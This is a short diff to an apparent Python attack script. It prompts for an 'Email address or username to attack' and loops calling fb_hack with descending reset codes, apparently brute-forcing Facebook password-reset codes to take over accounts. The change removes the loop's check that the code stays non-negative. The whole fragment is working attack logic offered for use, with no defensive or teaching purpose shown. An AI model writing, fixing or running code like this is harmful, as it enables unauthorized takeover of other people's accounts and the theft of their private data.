@@ -213,11 +213,8 @@ ehack = input('Email address or username to attack:')
 reset = int(input('Code: ') or 99999999)
 while True:
   try:
-    if reset >= 0:
-      fb_hack(ehack, reset)
-      reset = reset1
-    else:
-      break
+    fb_hack(ehack, reset)
+    reset = reset1
   except:
     sys.exit()
     fb_hack(ehack, reset)
